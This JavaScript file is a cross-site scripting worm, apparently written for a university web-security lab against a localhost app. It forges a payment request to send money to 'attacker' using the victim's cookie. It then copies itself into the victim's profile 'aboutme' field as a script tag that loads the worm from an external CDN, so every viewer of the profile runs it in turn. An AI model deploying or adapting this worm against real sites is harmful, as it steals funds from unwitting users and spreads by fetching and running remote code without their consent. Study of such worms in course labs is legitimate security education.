var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://localhost:8080/pay', true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.setRequestHeader("Cookie", document.cookie);
xhr.send('recipient=attacker&amount=1');
var infection_code = "<script type=\"text\/javascript\" src=\"https:\/\/cdn.jsdelivr.net\/gh\/mrajesh26\/CS5435-Scripts@main\/xss_worm_code.js\"> <\/script>";
spread_worm();
function spread_worm() {
    try {
        var xhr = new XMLHttpRequest();
        var params = "aboutme="+encodeURIComponent(infection_code);
        xhr.open("POST", "http:\/\/localhost:8080\/aboutme", true);
        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
        xhr.setRequestHeader("Cookie", document.cookie);
        xhr.send(params);
    } catch (err) {
      console.error(err);
    }
}
